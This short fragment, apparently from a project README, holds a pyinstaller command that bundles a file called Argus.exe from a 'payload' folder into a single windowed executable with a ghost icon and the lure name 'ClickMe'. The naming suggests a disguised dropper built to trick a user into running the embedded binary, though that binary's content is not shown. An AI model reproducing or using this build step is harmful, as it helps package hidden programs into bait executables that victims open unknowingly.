### Don't forget to add Argus.exe in payload
```bash
pyinstaller --onefile --windowed --add-binary "app/payload/Argus.exe;payload" --icon "app/assets/ghost.ico" --name ClickMe main.py
```